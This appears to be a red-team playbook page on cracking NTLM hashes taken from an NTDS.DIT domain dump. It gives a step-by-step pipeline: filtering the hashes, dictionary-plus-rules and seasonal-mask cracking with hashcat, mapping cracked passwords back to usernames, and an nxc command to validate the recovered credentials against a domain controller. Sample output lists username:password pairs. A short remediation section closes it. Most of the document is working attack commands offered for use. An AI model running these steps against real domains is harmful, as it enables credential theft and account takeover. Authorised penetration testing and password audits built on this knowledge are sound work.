# NTLM Hash Cracking

**MITRE:** [T1110.002 - Brute Force: Password Cracking](https://attack.mitre.org/techniques/T1110/002/)  
**Phase:** Credential Access  
**Auth Required:** No (offline — hashes already obtained)  
**Tags:** #credential-access #hashcat #ntlm #password-cracking

---

## Summary
After obtaining NTLM hashes from an NTDS.DIT dump, crack them offline using hashcat. NTLM is a fast, unsalted hash — modern GPUs can attempt billions per second. Filter out machine accounts, krbtgt, and blank hashes before cracking to reduce noise and focus on human-chosen passwords.

## Mechanism
- **Protocol:** Offline (no network required)
- **Hash Type:** NTLM (hashcat mode 1000)
- **Effect:** Recovers plaintext passwords from domain account hashes

## Commands
```bash
# Step 1 — Filter raw secretsdump output
grep -v '^[^:]*\$:' ntds.dit.txt \          # remove machine accounts ($)
| grep -v '^krbtgt:' \                        # remove krbtgt
| grep -v ':aad3b435b51404eeaad3b435b51404ee:' \  # remove blank LM placeholder
| grep -v ':31d6cfe0d16ae931b73c59d7e0c089c0:' \  # remove empty NTLM hash
> ntds_filtered.txt

# Step 2 — Extract unique NTLM hashes for cracking
cut -d: -f4 ntds_filtered.txt | grep -v '^\s*$' | sort -u > unique_ntlm_hashes.txt

# Step 3 — Verify counts
wc -l unique_ntlm_hashes.txt

# Step 4 — Crack: dictionary + rules (best first pass)
hashcat -m 1000 unique_ntlm_hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule \
  -o cracked.txt

# Step 5 — Crack: seasonal mask (catches Summer2023!, Fall2022@, etc.)
hashcat -m 1000 unique_ntlm_hashes.txt \
  -a 3 ?u?l?l?l?l?l?d?d?d?d?s \
  -o cracked.txt --append

# Step 6 — Export cracked pairs (hash:plaintext)
hashcat -m 1000 unique_ntlm_hashes.txt --show > cracked_pairs.txt

# Step 7 — Map cracked hashes back to usernames
awk -F: 'NR==FNR{a[$1]=$2; next} ($4 in a){print $1":"a[$4]}' \
  cracked_pairs.txt ntds_filtered.txt > accounts_cracked.txt
```

## Expected Output
```
[+] hashcat starting...
Dictionary cache hit: /usr/share/wordlists/rockyou.txt
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1000 (NTLM)
Recovered........: 625/3842 (16.27%)

# accounts_cracked.txt format:
DOMAIN\jsmith:Summer2023!
DOMAIN\bwilliams:Welcome1
DOMAIN\tjones:Fall2022!
```

## Notes
- NTLM is unsalted — identical passwords produce identical hashes; crack once, applies to all users sharing that password
- 625 unique hashes cracked ≠ 846 accounts — gap = password reuse across accounts
- GPU cracking vastly faster than CPU; RTX 3090 = ~70B NTLM hashes/sec
- Potfile (`~/.hashcat/hashcat.potfile`) stores all cracked hashes persistently across sessions

## Relay / Follow-On Attack Path
- Map cracked hashes → accounts: [[ntds-account-mapping]]
- Validate active creds: `nxc ldap <DC> -u usernames.txt -p passwords.txt --no-bruteforce --continue-on-success`
- Test MFA bypass: [[mfa-bypass-legacy-auth]]
- Analyze patterns: [[pipal]] (see tools/)

## Remediation
- Enforce strong password policy (14+ chars, complexity)
- Deploy LAPS for local admin accounts
- Audit and rotate service account passwords
- Enable Password Protection (block common passwords via Azure AD Password Protection on-prem)
- Force password reset for all accounts predating current policy

## Related
- [[ntds-account-mapping]]
- [[ntlmv1-permitted]]
- [[domain-password-policy]]
- [[mfa-bypass-legacy-auth]]
